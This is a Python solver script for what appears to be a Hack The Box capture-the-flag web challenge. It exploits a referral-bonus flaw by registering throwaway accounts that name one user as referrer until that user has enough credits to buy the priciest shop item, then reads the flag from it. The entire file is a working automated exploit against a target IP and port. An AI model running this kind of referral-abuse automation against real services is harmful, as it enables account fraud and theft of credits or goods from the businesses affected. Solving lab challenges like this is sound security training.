#!/usr/bin/env python3
import json
import re
import secrets
import sys
import urllib.error
import urllib.request

# Each registration that names an existing user as referrer_id gives the referrer
# 10 credits, and nothing checks that the referee is a real person. The solver
# registers referees until the referrer has enough credits for the most expensive
# shop item, then buys it. The purchased item's content holds the flag.

PASSWORD = "Passw0rd!"
REFERRAL_BONUS = 10
FLAG_RE = re.compile(r"HTB\{[^}]+\}")


def request(base, method, path, body=None, token=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(base + path, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return json.loads(resp.read().decode(errors="replace"))
    except urllib.error.HTTPError as err:
        raise SystemExit(f"[!] {method} {path} failed: {err.code} {err.read().decode(errors='replace')}")


def register(base, username, referrer=None):
    body = {"username": username, "password": PASSWORD}
    if referrer:
        body["referrer_id"] = referrer
    return request(base, "POST", "/api/auth/register", body)


def login(base, username):
    return request(base, "POST", "/api/auth/login", {"username": username, "password": PASSWORD})["access_token"]


def main():
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <target_ip> <target_port>", file=sys.stderr)
        sys.exit(1)

    base = f"http://{sys.argv[1]}:{sys.argv[2]}"

    referrer = f"qm{secrets.token_hex(4)}"
    register(base, referrer)
    token = login(base, referrer)

    shop = request(base, "GET", "/api/market/shop")["items"]
    target = max(shop, key=lambda item: item["price"])
    needed = target["price"]

    credits = request(base, "GET", "/api/market/profile", token=token)["credits"]
    while credits < needed:
        register(base, f"rf{secrets.token_hex(4)}", referrer=referrer)
        credits += REFERRAL_BONUS
    print(f"[+] Credits after referrals: {credits}")

    request(base, "POST", "/api/market/purchase", {"item_id": target["id"]}, token=token)
    print(f"[+] Bought: {target['name']} ({needed} credits)")

    items = request(base, "GET", "/api/market/my-items", token=token)["items"]
    for item in items:
        flag = FLAG_RE.search(item.get("content", ""))
        if flag:
            print(f"[+] Flag:\n{flag.group(0)}")
            return

    print("[!] No flag in purchased items", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
